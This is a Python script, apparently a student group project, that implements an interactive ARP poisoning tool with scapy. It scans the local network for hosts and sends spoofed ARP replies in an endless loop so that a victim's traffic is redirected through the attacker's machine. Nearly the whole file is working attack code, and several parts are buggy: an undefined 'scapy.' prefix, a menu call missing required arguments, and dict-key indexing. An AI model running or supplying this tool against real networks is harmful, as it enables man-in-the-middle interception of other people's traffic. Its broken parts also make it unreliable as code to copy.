from scapy.all import *
#from scapy.all import Ether, ARP, get_if_addr, conf, sendp
import argparse
from time import sleep

"""
ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)

Steps to achieve ARP poisoning:
1. Choose victim machine on the same network
2. Get IP address of victim
3. Continuously send ARP packets (with arbitrary MAC-adress) using scapy to victim machine
4. Choosing the MAC-adress of the router will force the traffic, which usually goes from victim -> router, to flow from victim -> this machine

"""
# command line tool parser
parser = argparse.ArgumentParser(description="This program is an ARP poisoning tool")
args = parser.parse_args()

def print_banner():
    """
    Print some ASCII art for aesthetic purposes
    """
    banner="""
    _   ___ ___ ___ 
   /_\ | _ \ _ \ _ \\
  / _ \|   /  _/  _/
 /_/ \_\_|_\_| |_|  
                  By group 21  
    """
    print(banner)

class ARPP(object):
    def __init__(self):
        self.SELECTED_INTERFACE = None
        self.TASK_DICT = {"help":parser.print_help,\
            "scan local network for users":self.get_network_users_ARPSCAN,\
            "menu":self.print_menu,\
            "arp poison":self.ARP_poison,\
            "exit":quit,\
            "select interface":self.select_interface}
    
    def _get_my_ip(self):
        my_ip = get_if_addr(self.SELECTED_INTERFACE) # this is a string
        return my_ip
    
    def _get_my_mac(self):
        while self.SELECTED_INTERFACE is None:
                self.select_interface()
        return get_if_hwaddr(self.SELECTED_INTERFACE)
            
    
    def _get_mac_from_ip(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = broadcast / arp_request
        answ = scapy.srp(pkt, timeout=1, verbose=False)[0]
        return answ[0][1].hwsrc

    def _represents_int(self, i):
        try: 
            int(i)
        except ValueError:
            return False
        else:
            return True

    def print_menu(self):
        task_names = self.TASK_DICT.keys()
        for i, task_name in enumerate(task_names, start=0):
            print("{}: {}".format(i, task_name))


    def get_ip_range(self, ip_range=None):
        if ip_range is None:
            ip_range = self._get_my_ip()+"/24"
        return ip_range

    def select_interface(self):
        # code breaks for Windows here
        print("Which interface would you like to use:")
        iflist = get_if_list()
        for i, _ in enumerate(iflist, start=0):
            print("{}: {}".format(i,_))
        
        answer = None
        while answer is None:
            try:
                answer = str(input("select interface>>"))
            except:
                answer = None
            
        if self._represents_int(answer):
            answer = int(answer)
            if answer < len(iflist):
                self.SELECTED_INTERFACE=iflist[answer]
            else:
                print("Interface does not exist\n")
        elif answer in iflist:
            self.SELECTED_INTERFACE = answer
        else:
            print("Interface does not exist\n")
    
    def get_network_users_ARPSCAN(self):
        """
        ARP ping scan
        """
        ip_range = self.get_ip_range()
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
        print("Scanning devices connected to network, please wait...")
        
        while self.SELECTED_INTERFACE is None:
            self.select_interface()
        print("Selected Interface: {}".format(self.SELECTED_INTERFACE))
            
        network_devices = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
        for i, user in enumerate(network_devices, start=1):
            print("{}          {}".format(user[1].psrc, user[1].hwsrc))
        
        #print(network_devices)
        if network_devices == []:
            print("No network devices found\n")
        
    def ARP_poison(self, ipVictim, ipToSpoof):
        """
        Victim's arp table will contain the entry
        ----------
        ...
        ipToSpoof at macAttacker
        ...
        ----------

        Args:
            ipVictim (str): _description_
            ipToSpoof (str): _description_
        """
        
        macVictim = self._get_mac_from_ip(ipVictim)
        macAttacker = self._get_my_mac()
                
        
        pkt = Ether() / ARP()
        pkt[Ether].src = macAttacker
        pkt[ARP].hwsrc = macAttacker
        pkt[ARP].psrc  = ipToSpoof
        pkt[ARP].hwdst = macVictim
        pkt[ARP].pdst  = ipVictim
            
        while True:
            sendp( pkt, iface=self.SELECTED_INTERFACE )
            sleep(5)


    def parse_command(self, command):
        if command == "":
            pass
        elif self._represents_int(command):
            command = int(command)
            try:
                task_name = self.TASK_DICT.keys()[command]
                task = self.TASK_DICT[task_name]
                task()
            except IndexError:
                print("Command not found\n")
        else:
            try:
                task = self.TASK_DICT[command]
                task()
            except:
                print("Command not found\n")

    def CLI(self):
        try:
            command = input(">>")
            command = str(command).lower()
            self.parse_command(command=command)
        except SyntaxError:
            pass

def main():
    cl = ARPP()
    print_banner()
    cl.print_menu()
    while True:
        cl.CLI()
    

if __name__=="__main__":
    main()